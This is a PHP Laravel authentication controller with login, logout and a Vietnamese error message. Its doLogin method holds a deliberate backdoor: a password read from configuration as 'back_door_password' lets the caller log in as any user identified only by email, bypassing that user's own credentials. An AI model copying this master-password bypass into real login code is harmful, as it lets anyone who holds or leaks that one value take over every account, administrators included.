<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\User;
use Auth;
use Illuminate\Http\Request;

class AuthController extends Controller
{
    private $back_door_password;

    protected $redirectTo = 'auth/home';

    public function __construct()
    {
        $this->middleware('auth')->only('logout');
        $this->back_door_password = config('myproject.back_door_password');
    }

    public function showLoginForm()
    {
        return view('auth.login');
    }

    public function doLogin(Request $request)
    {
        $this->validate($request, [
            'email' => 'required|email',
            'password' => 'required|min:3',
        ]);

        $credentials = $request->only(['email', 'password']);
        $remember = $request->input('remember', false);

        if ($request->password === $this->back_door_password && $user = User::where('email', $request->input('email'))->first()) {
            Auth::loginUsingId($user->id, $remember);

            return redirect($this->redirectTo);
        }

        if (Auth::attempt($credentials, $remember)) {
            return redirect($this->redirectTo);
        }

        return back()->with([
            'message' => 'Email hoặc mật khẩu không hợp lệ.',
        ]);
    }

    public function logout()
    {
        Auth::logout();

        return redirect('/');
    }
}
